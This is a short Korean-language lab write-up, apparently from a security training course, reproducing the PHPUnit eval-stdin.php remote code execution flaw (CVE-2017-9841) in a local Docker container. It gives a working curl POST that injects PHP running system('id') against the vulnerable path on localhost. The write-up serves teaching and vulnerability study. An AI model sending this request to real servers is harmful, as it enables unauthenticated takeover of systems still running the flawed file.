# PHPUnit/CVE-2017-9841

> 화이트햇 스쿨 3기 - 김수연 (ksuyeon0124@gmail.com)
> 
&nbsp;
### CVE 요약

- PHPUnit에 있는 `eval-stdin.php` 파일이 사용자 입력을 그대로 `eval()`로 실행한다.
- 공격자가 POST 요청으로 악성 PHP 코드를 보내 서버에서 실행 가능하다.
- 인증 없이 **원격 코드 실행(RCE)**이 가능해서 서버의 완전 장악이 가능하다.  

&nbsp;   
### 환경 구성

- 아래 커멘드를 입력하여 컨테이너를 올렸다.
    - `docker compose up -d`  

&nbsp;
### 취약점 실행

- 아래 명령어를 입력해서 이 시스템의 id를 출력해보려고 한다. 이 PHP 코드는 서버에서 **`id` 명령어**를 실행하는 명령어이다.

```bash
curl -X POST http://127.0.0.1:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('id'); ?>"
```

- 아래와 같이 정보가 출력되는 것을 확인할 수 있다.

![result](https://github.com/user-attachments/assets/912fee33-a20d-4fdd-aded-b316897f61c9)  

&nbsp;       
### 정리

- 원래는 서버에서 사용자 입력의 실행이 금지되어야 하는데, `eval-stdin.php` 로 인해 실행이 된다. 하여 서버로 `system`의 `id`를 출력하는 명령어를 보냈는데, 그 정보를 그대로 출력하는 것을 확인할 수 있었다.
